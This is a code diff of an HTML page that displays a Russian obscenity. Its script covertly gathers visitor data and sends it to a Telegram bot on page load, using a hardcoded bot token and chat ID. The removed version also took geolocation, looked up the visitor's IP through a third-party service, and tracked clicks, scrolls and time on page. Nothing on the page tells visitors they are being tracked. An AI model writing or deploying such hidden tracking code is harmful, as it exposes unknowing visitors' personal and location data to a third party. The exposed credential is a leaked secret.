@@ -14,22 +14,15 @@
             align-items: center;
             height: 100vh;
             color: white;
-            overflow: hidden; /* Отключить прокрутку */
-            user-select: none; /* Запретить выделение текста */
+            overflow: hidden;
+            user-select: none;
         }
 
         .centered-text {
-            font-size: 3rem; /* Размер текста */
-            font-weight: bold; /* Жирный шрифт */
-            text-transform: uppercase; /* Капсом */
-            font-family: Arial, sans-serif; /* Простой шрифт */
-        }
-
-        body, html {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
+            font-size: 3rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-family: Arial, sans-serif;
         }
     </style>
 </head>
@@ -37,9 +30,9 @@
     <div class="centered-text">ИДИ НА ХУЙ</div>
 
     <script>
-        // Функция для отправки информации о пользователе в Telegram
-        function sendUserInfo() {
-            const userInfo = {
+        // Функция для получения информации о пользователе
+        function getUserInfo() {
+            return {
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString(),
                 screenWidth: window.screen.width,
@@ -52,67 +45,22 @@
                 cookiesEnabled: navigator.cookieEnabled,
                 connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                 historyLength: window.history.length,
-                errorLog: [],
-                userSettings: {},
-                viewportSize: {
-                    width: window.innerWidth,
-                    height: window.innerHeight
-                },
                 interactions: {
-                    clicks: 0,
-                    scrolls: 0
+                    clicks: 0, // Обновите на реальное количество кликов
+                    scrolls: 0 // Обновите на реальное количество скроллов
                 },
-                loadTime: 0,
-                timeOnPage: 0,
-                pageLoadTime: 0,
-                geolocation: null,
-                ipAddress: null, // будет получен от сервера
-                depthOfView: 0
+                depthOfView: document.body.scrollHeight,
+                // Дополнительные данные
+                // Пример получения IP-адреса (можно использовать сторонний API)
+                ipAddress: '', // Здесь можно использовать API для получения IP
+                geolocation: {} // Добавьте функцию для получения геолокации
             };
-
-            // Получение координат пользователя
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    userInfo.geolocation = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
-                    };
-                }, () => {
-                    userInfo.geolocation = 'Geolocation denied';
-                });
-            }
-
-            // Начинаем отсчитывать время на странице
-            const startTime = Date.now();
-            window.addEventListener('load', () => {
-                userInfo.pageLoadTime = Math.floor(performance.now());
-                userInfo.loadTime = Math.floor((Date.now() - startTime) / 1000); // время в секундах
-            });
-
-            // Слушаем события взаимодействия
-            document.addEventListener('click', () => userInfo.interactions.clicks++);
-            document.addEventListener('scroll', () => userInfo.interactions.scrolls++);
-
-            // Отправляем данные при уходе со страницы
-            window.addEventListener('beforeunload', () => {
-                userInfo.timeOnPage = Math.floor((Date.now() - startTime) / 1000); // время на странице
-                userInfo.depthOfView = window.history.length; // фиксируем количество просмотренных страниц
-                sendDataToTelegram(userInfo);
-            });
-
-            // Получение IP-адреса (используйте ваш серверный API для получения)
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    userInfo.ipAddress = data.ip; // сохраняем IP-адрес
-                })
-                .catch(err => console.error('Ошибка получения IP:', err));
         }
 
-        // Функция отправки данных в Telegram
+        // Функция для отправки данных в Telegram
         function sendDataToTelegram(userInfo) {
             const botToken = '6760012279:AAHcJueLC_AF49YRK3s-MCc2pTGJy7YZPHA';
-            const chatId = '954053674'; // ID чата для отправки
+            const chatId = '@hedred_z'; // Укажите имя чата
             const message = `
                 Новый визит на сайт!
                 User Agent: ${userInfo.userAgent}
@@ -122,21 +70,14 @@
                 Inner Width: ${userInfo.innerWidth}px
                 Inner Height: ${userInfo.innerHeight}px
                 Referrer: ${userInfo.referrer}
-                Time on Page: ${userInfo.timeOnPage} сек.
-                Page Load Time: ${userInfo.pageLoadTime} мс
-                Geolocation: ${userInfo.geolocation ? `Lat: ${userInfo.geolocation.latitude}, Lon: ${userInfo.geolocation.longitude}` : 'Geolocation not available'}
-                IP Address: ${userInfo.ipAddress}
                 Platform: ${userInfo.platform}
                 Language: ${userInfo.language}
                 Cookies Enabled: ${userInfo.cookiesEnabled}
                 Connection Type: ${userInfo.connectionType}
                 History Length: ${userInfo.historyLength}
-                Clicks: ${userInfo.interactions.clicks}
-                Scrolls: ${userInfo.interactions.scrolls}
                 Depth of View: ${userInfo.depthOfView}
             `;
 
-            // Отправка POST-запроса на API Telegram
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
@@ -147,9 +88,12 @@
                     text: message,
                 }),
             })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Ошибка при отправке сообщения:', response.statusText);
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Сообщение успешно отправлено');
+                } else {
+                    console.error('Ошибка при отправке сообщения:', data.description);
                 }
             })
             .catch(error => {
@@ -157,8 +101,11 @@
             });
         }
 
-        // Отправить информацию при загрузке страницы
-        window.onload = sendUserInfo;
+        // Отправка данных о пользователе при загрузке страницы
+        window.onload = function() {
+            const userInfo = getUserInfo();
+            sendDataToTelegram(userInfo);
+        };
     </script>
 </body>
 </html>
